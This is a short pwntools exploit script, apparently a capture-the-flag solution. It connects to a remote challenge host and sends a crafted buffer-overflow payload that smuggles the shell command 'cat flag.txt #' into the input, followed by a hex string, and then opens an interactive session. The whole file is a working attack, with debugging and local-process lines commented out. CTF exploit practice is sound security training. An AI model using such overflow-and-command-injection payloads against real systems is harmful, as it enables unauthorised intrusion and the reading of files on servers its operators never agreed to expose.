from pwn import *
#p = process("./923e8e4915274f8fb741c3374e720d33")
p = remote("111.198.29.45",40607)

payload = "a"*0x100 + "cat flag.txt #".ljust(0x1b,"b")+"02d7160d77e18c6447be80c2e355c7ed4388545271702c50253b0914c65ce5fe"

#gdb.attach(p, "b * 0x0000555555554000+0xbd5")
p.sendline(payload)

p.interactive()
